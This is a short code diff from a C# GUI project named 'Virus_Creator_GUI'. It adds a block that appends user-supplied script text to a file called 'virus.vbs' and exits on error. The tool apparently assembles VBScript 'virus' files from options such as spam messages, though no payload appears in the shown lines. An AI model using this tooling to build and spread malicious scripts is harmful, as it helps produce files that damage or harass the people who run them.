@@ -285,6 +285,16 @@ namespace Virus_Creator_GUI
             customScript = textBox.Text;
 
             //Agrega el contenido al archivo
+            try
+            {
+                string script = customScript;
+                File.AppendAllText("virus.vbs", script);
+            }
+            catch
+            {
+                MessageBox.Show("Error creando el archivo!");
+                Application.Exit();
+            }
         }
 
         private void Btn_spamMessage_Click(object sender, EventArgs e)
